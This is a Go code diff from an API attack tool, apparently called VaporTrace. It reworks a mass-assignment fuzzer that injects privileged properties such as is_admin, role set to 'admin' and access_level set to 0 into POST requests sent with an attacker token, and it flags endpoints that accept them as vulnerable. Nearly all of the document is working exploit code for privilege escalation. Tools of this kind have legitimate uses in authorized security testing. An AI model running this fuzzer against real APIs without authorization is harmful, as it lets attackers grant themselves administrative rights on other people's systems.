@@ -5,7 +5,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"net/http"
-	"sync" // Required for Phase 9.8 Concurrency
+	"sync"
 
 	"github.com/JoseMariaMicoli/VaporTrace/pkg/db"
 	"github.com/pterm/pterm"
@@ -14,137 +14,123 @@ import (
 // BOPLAContext defines the target and the base payload to fuzz
 type BOPLAContext struct {
 	TargetURL string
-	Method    string // Usually PATCH or PUT
-	BaseJSON  string // The valid JSON body captured from the proxy
+	Method    string // Usually POST, PATCH or PUT
+	BaseJSON  string // The valid JSON body captured from the proxy or discovery
 }
 
-// Common administrative properties to inject for API3:2023 (Mass Assignment)
+// Common administrative properties to inject for API3:2023 (Broken Object Property Level Authorization)
 var administrativeKeys = []string{
 	"is_admin", "isAdmin", "role", "privileges", "status", "verified",
 	"permissions", "group_id", "internal_flags", "account_type",
-	"is_staff", "can_delete", "access_level",
+	"is_staff", "can_delete", "access_level", "is_vip", "debug",
 }
 
-// ExecuteMassBOPLA (Phase 9.8) automates property fuzzing across the discovery pipeline
+// ExecuteMassBOPLA automates property fuzzing across the discovery pipeline.
+// It filters GlobalDiscovery.Inventory for endpoints tagged with "BOPLA".
 func ExecuteMassBOPLA(concurrency int) {
 	pterm.DefaultSection.Println("Phase 9.8: Industrialized BOPLA Engine")
 
+	GlobalDiscovery.mu.RLock()
 	var targets []string
-	GlobalDiscovery.mu.Lock()
-	for _, path := range GlobalDiscovery.Endpoints {
-		// Heuristic: Targeted selection for write-capable endpoints
-		targets = append(targets, path)
+	for path, entry := range GlobalDiscovery.Inventory {
+		isTarget := false
+		for _, eng := range entry.Engines {
+			if eng == "BOPLA" {
+				isTarget = true
+				break
+			}
+		}
+		if isTarget {
+			targets = append(targets, path)
+		}
 	}
-	GlobalDiscovery.mu.Unlock()
+	GlobalDiscovery.mu.RUnlock()
 
 	if len(targets) == 0 {
-		pterm.Warning.Println("No targets found in discovery store. Run 'map' or 'swagger' first.")
+		pterm.Info.Println("No BOPLA-prone mutation endpoints detected.")
 		return
 	}
 
-	for _, url := range targets {
-		pterm.Info.Printfln("Starting mass property fuzzing on: %s", url)
+	for _, path := range targets {
+		pterm.Info.Printfln("BOPLA Fuzzing Resource: %s", path)
 		
-		// Create a baseline context for this specific URL
+		// Create context. We use POST as default for industrialized creation/update probing.
 		ctx := &BOPLAContext{
-			TargetURL: url,
-			Method:    "PUT", // Defaulting to PUT for property updates
-			BaseJSON:  "{}",    // Initializing empty JSON if no baseline provided
+			TargetURL: CurrentSession.TargetURL + path,
+			Method:    "POST", 
+			BaseJSON:  "{}", // Starting with an empty object for discovery
 		}
-		
-		ctx.MassFuzz(concurrency)
+		ctx.RunFuzzer(concurrency)
 	}
 }
 
-// MassFuzz implements the Phase 9.3 Worker Pool for JSON property injection
-func (b *BOPLAContext) MassFuzz(threads int) {
-	keyChan := make(chan string, len(administrativeKeys))
+// RunFuzzer orchestrates the property injection worker pool
+func (b *BOPLAContext) RunFuzzer(concurrency int) {
 	var wg sync.WaitGroup
+	keyChan := make(chan string, len(administrativeKeys))
 
-	pb, _ := pterm.DefaultProgressbar.WithTotal(len(administrativeKeys)).WithTitle("Fuzzing Properties").Start()
-
-	// 1. Spawn Worker Pool
-	for w := 1; w <= threads; w++ {
+	for i := 0; i < concurrency; i++ {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
 			for key := range keyChan {
-				b.InjectAndProbeSilent(key)
-				pb.Increment()
+				b.ProbeProperty(key)
 			}
 		}()
 	}
 
-	// 2. Feed Keys
 	for _, key := range administrativeKeys {
 		keyChan <- key
 	}
 	close(keyChan)
-
-	// 3. Wait for workers
 	wg.Wait()
-	pb.Stop()
 }
 
-// InjectAndProbeSilent handles high-speed execution with SafeDo mirroring (Phase 9.6)
-func (b *BOPLAContext) InjectAndProbeSilent(key string) {
-	activeToken := CurrentSession.AttackerToken
-
+// ProbeProperty attempts to inject a specific key and monitors for acceptance
+func (b *BOPLAContext) ProbeProperty(key string) {
 	// 1. Prepare Payload
-	var data map[string]interface{}
-	_ = json.Unmarshal([]byte(b.BaseJSON), &data)
-	if data == nil {
-		data = make(map[string]interface{})
+	payloadMap := make(map[string]interface{})
+	_ = json.Unmarshal([]byte(b.BaseJSON), &payloadMap)
+	
+	// Inject tactical values based on key name heuristics
+	if key == "role" || key == "account_type" {
+		payloadMap[key] = "admin"
+	} else if key == "group_id" || key == "access_level" {
+		payloadMap[key] = 0 // Often 0 or 1 signifies superuser in legacy systems
+	} else {
+		payloadMap[key] = true
 	}
 
-	// Logic for value injection based on key type
-	data[key] = true
-	if key == "role" { data[key] = "admin" }
-	if key == "group_id" { data[key] = 0 }
+	payload, _ := json.Marshal(payloadMap)
 
-	payload, _ := json.Marshal(data)
-
-	// 2. Prepare Request
+	// 2. Build Request
 	req, _ := http.NewRequest(b.Method, b.TargetURL, bytes.NewBuffer(payload))
 	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("User-Agent", "VaporTrace/2.1.0 (Phase 9.10 Industrialized)")
+	
+	activeToken := CurrentSession.AttackerToken
 	if activeToken != "" {
 		req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", activeToken))
 	}
 
-	// 3. Execute via SafeDo (Phase 9.6 Mirroring)
+	// 3. Execute via SafeDo gatekeeper
+	// isHit is false here because we only care about the response code analysis
 	resp, err := SafeDo(req, false, "BOPLA-ENGINE")
 	if err != nil {
 		return
 	}
 	defer resp.Body.Close()
 
-	// 4. Analysis: Success codes indicate the property was accepted
+	// 4. Analysis: Success codes (200, 201, 204) indicate the property was likely accepted by the server logic
 	if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusNoContent || resp.StatusCode == http.StatusCreated {
-		pterm.Warning.Prefix = pterm.Prefix{Text: "HIT", Style: pterm.NewStyle(pterm.BgMagenta, pterm.FgWhite)}
-		pterm.Warning.Printfln(" BOPLA Success: Key [%s] accepted by %s", key, b.TargetURL)
+		pterm.Warning.Prefix = pterm.Prefix{Text: "HIT", Style: pterm.NewStyle(pterm.BgMagenta, pterm.FgBlack)}
+		pterm.Warning.Printfln("BOPLA Potential: Property '%s' accepted at %s (Status: %d)", key, b.TargetURL, resp.StatusCode)
 
-		// PERSISTENCE
 		db.LogQueue <- db.Finding{
-			Phase:   "PHASE 9.8: INDUSTRIALIZED BOPLA",
+			Phase:   "PHASE IV: INJECTION",
 			Target:  b.TargetURL,
-			Details: fmt.Sprintf("Mass Assignment: property '%s' accepted", key),
-			Status:  "EXPLOITED",
+			Details: fmt.Sprintf("BOPLA Property Injection Success: '%s' accepted", key),
+			Status:  "VULNERABLE",
 		}
-
-		// Background Hit-Mirroring for IR visibility
-		go func() {
-			hitReq, _ := http.NewRequest(b.Method, b.TargetURL, bytes.NewBuffer(payload))
-			hitReq.Header.Set("Content-Type", "application/json")
-			if activeToken != "" {
-				hitReq.Header.Set("Authorization", fmt.Sprintf("Bearer %s", activeToken))
-			}
-			SafeDo(hitReq, true, "BOPLA-ENGINE")
-		}()
 	}
-}
-
-// Fuzz remains as the legacy surgical single-threaded method
-func (b *BOPLAContext) Fuzz() {
-	pterm.DefaultHeader.WithFullWidth(false).Println("BOPLA Surgical Fuzzer")
-	b.MassFuzz(1) 
 }
